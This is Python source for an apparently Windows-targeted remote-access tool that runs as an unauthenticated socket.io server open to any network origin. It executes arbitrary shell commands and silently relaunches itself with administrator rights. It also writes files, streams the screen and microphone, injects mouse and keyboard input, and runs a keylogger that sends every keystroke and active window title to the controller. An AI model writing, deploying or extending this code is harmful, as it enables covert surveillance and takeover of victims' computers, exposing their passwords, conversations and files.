import asyncio
import socketio
import base64
from aiohttp import web
import mss
import subprocess
import os
import sys
import ctypes
from PIL import Image
import io
import pyaudio
import numpy as np
import threading
import win32gui
import win32ui
import sounddevice as sd
import soundfile as sf
import win32process
import keyboard
from screeninfo import get_monitors

sio = socketio.AsyncServer(cors_allowed_origins='*')
app = web.Application()
sio.attach(app)

HOST = '0.0.0.0'
SOCKET_PORT = 4101

working_dir = "."
_capture_screen = bool(False)
_start_keylog = bool(False)

audio_on = False

AUDIO_FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024
DURATION = 1

primary_monitor = None
for m in get_monitors():
    if m.is_primary:
        primary_monitor = m
        break

screen_width = primary_monitor.width
screen_height = primary_monitor.height

@sio.event
async def connect(sid, environ):
    global audio_on
    print('connect', sid)
    await sio.emit('command_dir', os.path.abspath(working_dir))
    audio_on = False

@sio.event
async def disconnect(sid):
    print('disconnect', sid)
    await stop_stream()
    await stop_keylog()
    
@sio.event
async def start_stream(_, data):
    global audio_on, _capture_screen
    
    res = data['res']
    fps = data['fps']
    fps = 1 / int(fps)
    
    print("start_stream with res:", res + ", fps:", fps)
    _capture_screen = True
    
    asyncio.create_task(capture_screen(res, fps))
    
    if audio_on:
        audio_thread = threading.Thread(target=asyncio.run, args=(stream_audio(),), daemon=True)
        audio_thread.start()

    
async def capture_screen(res, fps):
    while _capture_screen:
        with mss.mss() as sct:
            try:
                res = int(res)
            except:
                print("res is not an int:", res)

            sct.compression_level = 1
            monitor = sct.monitors[1]  # or a specific region
            sct_img = sct.grab(monitor)
            sct_bytes = bytearray(sct_img.rgb)
            try:
                sct_img_mouse = add_mouse(sct_bytes, monitor['width'])
            except:
                sct_img_mouse = sct_bytes
                pass

            # Convert the captured image to a PIL Image
            img = Image.frombytes("RGB", sct_img.size, sct_img_mouse)

            # Resize the image
            width, height = img.size
            img_resized = img.resize((width // res, height // res), Image.LANCZOS)

            # Save as PNG and encode in base64
            with io.BytesIO() as output:
                img_resized.save(output, format="PNG")
                png_data = output.getvalue()

            png_data_encoded = base64.b64encode(png_data).decode()

            # Emit screen data
            await sio.emit('stream_data', png_data_encoded)

            # Delay between iterations
            await asyncio.sleep(fps)


async def stream_audio():
    print("start audio")
    while _capture_screen:
        audio_data = sd.rec(int(RATE * DURATION), samplerate=RATE, channels=1, dtype=np.float32)
        sd.wait()  # Wait for the recording to complete

        # Save the recorded audio to a WAV file and read the data
        sf.write("temp.wav", audio_data, RATE)
        with open("temp.wav", 'rb') as f:
            audio_bytes = f.read()

        # Send the audio data to the server
        await sio.emit('audio_data', audio_bytes)
        await asyncio.sleep(0.05)
        
    print("stop audio")

@sio.event
async def stop_stream(*_):
    global _capture_screen
    _capture_screen = False
    print("stop_screen")

@sio.event
async def audio_toggle(*_):
    global audio_on
    audio_on = not audio_on

@sio.event
async def command_input(_, cmd_in):
    # Function to execute a command and save its output
    async def doCMD(cmd, working_dir):
        # Check if command is 'cd'
        if cmd.startswith("cd "):
            vals = cmd.split("cd ")
            if vals[1].startswith("/"):
                working_dir = vals[1]
            else:
                working_dir = os.path.join(working_dir, vals[1])
            
            # Change the working directory
            os.chdir(working_dir)
            await sio.emit('command_dir', os.popen('cd').read().strip())
            await sio.emit('command_output', os.popen('cd').read().strip())
        elif cmd.startswith('admin'):
            await get_admin(cmd, working_dir)
        else:
            # Execute the command and get the output
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=working_dir)
            await sio.emit('command_output', result.stdout)
            await sio.emit('command_output_error', result.stderr)
        
        return working_dir

    # Main loop to read commands and execute them
    async def command_loop(working_dir):
        working_dir = await doCMD(cmd_in, working_dir)

    # Run the command loop
    await command_loop(working_dir)

async def get_admin(cmd, working_dir):
    # Check if running with admin privileges
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    # Relaunch the script with admin privileges if needed
    async def run_as_admin(cmd, working_dir):
        print('admin:', is_admin())
        if is_admin():
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=working_dir)
            await sio.emit('command_output', result.stdout)
            await sio.emit('command_output_error', result.stderr)
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)

    # Run the script with admin permissions
    await run_as_admin(cmd, working_dir)
    
@sio.event
async def create_file(_, data):
    directory = data['directory']
    file_name = data['fileName']
    file_extension = data['fileExtension']
    content = data['content']
    # Ensure the directory exists, or create it
    if not os.path.exists(directory):
        os.makedirs(directory)

    # Combine the directory and file name to get the full file path
    file_path = os.path.join(directory, f"{file_name}.{file_extension}")

    # Create and write content to the file
    with open(file_path, 'w') as file:
        file.write(content)

    print(f'created file: {directory}/{file_name}.{file_extension}\ncontent: {content}')


def set_pixel(img, w, x, y, rgb=(0,0,0)):
    """
    Set a pixel in a, RGB byte array
    """
    pos = (x*w + y)*3
    if pos>=len(img):return img # avoid setting pixel outside of frame
    img[pos:pos+3] = rgb
    return img

def add_mouse(img, w):
    flags, hcursor, (cx,cy) = win32gui.GetCursorInfo()
    cursor = get_cursor(hcursor)
    cursor_mean = cursor.mean(-1)
    where = np.where(cursor_mean>0)
    for x, y in zip(where[0], where[1]):
        rgb = [x for x in cursor[x,y]]
        img = set_pixel(img, w, x+cy, y+cx, rgb=rgb)
    return img


def get_cursor(hcursor):
    info = win32gui.GetCursorInfo()
    hdc = win32ui.CreateDCFromHandle(win32gui.GetDC(0))
    hbmp = win32ui.CreateBitmap()
    hbmp.CreateCompatibleBitmap(hdc, 36, 36)
    hdc = hdc.CreateCompatibleDC()
    hdc.SelectObject(hbmp)
    hdc.DrawIcon((0,0), hcursor)
    
    bmpinfo = hbmp.GetInfo()
    bmpbytes = hbmp.GetBitmapBits()
    bmpstr = hbmp.GetBitmapBits(True)
    im = np.array(Image.frombuffer(
        'RGB',
         (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
         bmpstr, 'raw', 'BGRX', 0, 1))
    
    win32gui.DestroyIcon(hcursor)    
    win32gui.DeleteObject(hbmp.GetHandle())
    hdc.DeleteDC()
    return im


def get_active_window_title():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def get_active_window_pid():
    return win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())[1]

async def on_key_event(event):
    # with open('0x29812exp.txt', 'a', encoding='utf-8') as f:
    print(event.name, 'pressed')
    if event.name == 'space':
        await sio.emit('keylog_press_con', ' ')
    elif event.name == 'enter':
        await sio.emit('keylog_press', '↵')
    elif event.name == 'backspace':
        await sio.emit('keylog_press_con', '←')
    else:
        await sio.emit('keylog_press_con', event.name)

def on_key_event_wrapper(event):
    if _start_keylog:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(on_key_event(event))

async def check_window_change():
    global _start_keylog
    
    previous_window_pid = get_active_window_pid()
    keyboard.on_press(on_key_event_wrapper)
    
    while _start_keylog:
        current_window_pid = get_active_window_pid()

        if current_window_pid != previous_window_pid:
            previous_window_pid = current_window_pid
            await sio.emit('keylog_screen_change', get_active_window_title())

        await asyncio.sleep(0.2)

@sio.event
async def start_keylog(*_):
    global _start_keylog
    
    print("start keylogging")
    _start_keylog = True
    keylog_thread = threading.Thread(target=asyncio.run, args=(check_window_change(),), daemon=True)
    keylog_thread.start()

@sio.event
async def stop_keylog(*_):
    global _start_keylog
    
    print("stop keylogging")
    keyboard.unhook_all()
    _start_keylog = False


async def read_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            await sio.emit("file_content", file.read())
    else:
        await sio.emit('file_read_not_found', True)


async def edit_file(file_path, new_content):
    if os.path.exists(file_path):
        with open(file_path, 'w') as file:
            file.write(new_content)
    else:
        await sio.emit('file_edit_not_found', True)

@sio.event
async def keypress_down(_, key):
    keyboard.press(key)
    
@sio.event
async def keypress_up(_, key):
    keyboard.release(key)

@sio.event
async def mouse_move(_, pos):
    # print(f'posX: {pos["x"]}, posY: {pos["y"]}\n, screenW: {screen_width}, screenH: {screen_height}\n')
    x = round(float(pos['x']) * screen_width)
    y = round(float(pos['y']) * screen_height)
    # print(f'x: {x}, y: {y}\n')
    ctypes.windll.user32.SetCursorPos(x, y)

@sio.event
async def mouse_down(_, button):
    btn_down: int
    if str(button) == '0':
        btn_down = 0x0002
    elif str(button) == '1':
        btn_down = 0x0020
    elif str(button) == '2':
        btn_down = 0x0008
    
    ctypes.windll.user32.mouse_event(btn_down, 0, 0, 0,0)
    ctypes.windll.user32.mouse_event(btn_down, 0, 0, 0,0)

@sio.event
async def mouse_up(_, button):
    btn_up: int
    if str(button) == '0':
        btn_up = 0x0004
    elif str(button) == '1':
        btn_up = 0x0040
    elif str(button) == '2':
        btn_up = 0x0010
    
    ctypes.windll.user32.mouse_event(btn_up, 0, 0, 0,0)
    ctypes.windll.user32.mouse_event(btn_up, 0, 0, 0,0)

if __name__ == '__main__':
    web.run_app(app=app, port=SOCKET_PORT, host=HOST)
